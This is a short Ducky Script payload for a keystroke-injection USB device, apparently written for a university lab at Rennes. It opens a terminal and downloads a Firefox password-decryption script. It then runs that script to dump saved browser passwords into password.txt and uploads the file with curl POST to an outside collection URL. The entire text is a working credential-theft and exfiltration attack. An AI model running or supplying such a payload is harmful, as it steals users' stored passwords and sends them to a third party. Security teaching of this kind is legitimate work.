DELAY 500 
CTRL ALT T
DELAY 1000
STRING cd Bureau/
DELAY 500
ENTER
DELAY 500
STRING curl -o firefox_decrypt.py https://ddealmei.github.io/assets/3b64d11ff0ac5da6a262b3490949ec7f6/firefox_decrypt.py
DELAY 500
ENTER
DELAY 500
STRING python3 firefox_decrypt.py > password.txt
DELAY 500
ENTER
DELAY 500
STRING curl -X POST --data-binary @password.txt --insecure https://ise2.istic.univ-rennes1.fr/hook/pprijent
DELAY 500
ENTER
